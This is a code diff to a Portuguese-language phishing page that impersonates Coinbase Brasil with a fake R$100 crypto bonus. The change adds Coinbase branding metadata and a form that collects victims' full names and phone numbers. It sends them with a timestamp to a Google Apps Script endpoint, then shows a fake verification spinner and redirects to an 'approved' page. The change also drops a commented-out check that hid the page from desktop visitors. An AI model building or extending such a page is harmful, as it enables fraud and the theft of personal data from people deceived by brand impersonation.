@@ -9,14 +9,26 @@
   <meta name="description" content="Ganhe R$100 em bônus ao criar sua conta Coinbase. Oferta exclusiva por tempo limitado. Verifique sua elegibilidade agora.">
   <meta property="og:title" content="Coinbase Brasil - Bônus de R$100 disponível para sua conta" />
   <meta property="og:description" content="Verifique se sua conta já está aprovada para receber o bônus de R$100 em criptomoeda. 100% gratuito e instantâneo." />
-  <meta property="og:url" content="https://CLIQUE-ABAIXO.app" />
+  <meta property="og:url" content="https://coinbase.com" />
   <meta property="og:type" content="website" />
   <meta property="og:image" content="https://i.imgur.com/W2lF6vq.png" />
   <link rel="icon" href="https://www.coinbase.com/assets/sw-cache/a_6z3OfXe9.png" type="image/png" sizes="32x32"/>
   <link rel="apple-touch-icon" href="https://www.coinbase.com/assets/sw-cache/a_GRKmPJt5.png" sizes="120x120"/>
   <style>
-    body { font-family: 'Inter', sans-serif; background: #f5f8fa; padding: 50px; text-align: center; }
-    .container { background: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: auto; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f5f8fa;
+      padding: 50px;
+      text-align: center;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
     input, button {
       width: 100%;
       padding: 12px;
@@ -32,34 +44,39 @@
       font-weight: bold;
       cursor: pointer;
     }
-  </style>
-  
-<!--   <script>
-    window.addEventListener('DOMContentLoaded', function () {
-      if (!/Mobi|Android/i.test(navigator.userAgent)) {
-        document.body.innerHTML = '';
-        document.body.style.backgroundColor = 'black';
-        document.title = 'Página não encontrada';
-      }
-    });
-  </script> -->
+    #loading-container {
+      display: none;
+      padding-top: 50px;
+      text-align: center;
+      font-family: Arial, sans-serif;
+    }
 
-  
-  
-  
-  
-  
+    #loading-container h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    #loading-container img {
+      width: 80px;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
     <h2>Parabéns! 🎉</h2>
     <p>Você recebeu essa página de um dos nossos gerentes.</p>
     <p>Digite seu nome completo e número para verificar sua recompensa de R$100:</p>
-    
+
     <input type="text" id="nome" placeholder="Nome completo" autocomplete="name">
     <input type="text" id="numero" placeholder="(00) 00000-0000" maxlength="15" autocomplete="tel" oninput="mascaraTelefone(this)" onclick="ajustarCursor(this)">
-
+    
     <button onclick="validar()">Verificar</button>
+  </div>
+
+  <!-- Loading interno -->
+  <div id="loading-container">
+    <h2>Aguarde... estamos verificando sua solicitação.</h2>
+    <img src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif" alt="Carregando...">
   </div>
 
   <script>
@@ -81,13 +98,46 @@
     }
 
     function validar() {
-      const tel = document.getElementById("numero").value;
-      if (tel.match(/^\(\d{2}\) \d{5}-\d{4}$/)) {
-        const nome = document.getElementById("nome").value.trim();
-        window.location.href = "loading1.html?nome=" + encodeURIComponent(nome);
-      } else {
+      const nome = document.getElementById("nome").value.trim();
+      const tel = document.getElementById("numero").value.trim();
+
+      if (!tel.match(/^\(\d{2}\) \d{5}-\d{4}$/)) {
         alert("Digite um número válido no formato (XX) XXXXX-XXXX");
+        return;
       }
+
+      // Oculta o formulário e mostra o loading
+      document.querySelector(".container").style.display = "none";
+      document.getElementById("loading-container").style.display = "block";
+
+      const url = "https://script.google.com/macros/s/AKfycbyln4iQVZbeJb_SAg4qAFUnPGjDwmO5qhx4AbHFqbelpgt_huAh7IMXVaayD-NQEcDkrg/exec";
+      const dataHora = new Date().toLocaleString("pt-BR");
+
+      const data = {
+        nome: nome,
+        telefone: tel,
+        datahora: dataHora
+      };
+
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(() => {
+        setTimeout(() => {
+          window.location.href = "aprovado.html";
+        }, 3000); // Redireciona após 3 segundos
+      })
+      .catch((error) => {
+        console.error("Erro ao enviar:", error);
+        alert("Erro de rede. Tente novamente mais tarde.");
+        document.querySelector(".container").style.display = "block";
+        document.getElementById("loading-container").style.display = "none";
+      });
     }
   </script>
 </body>
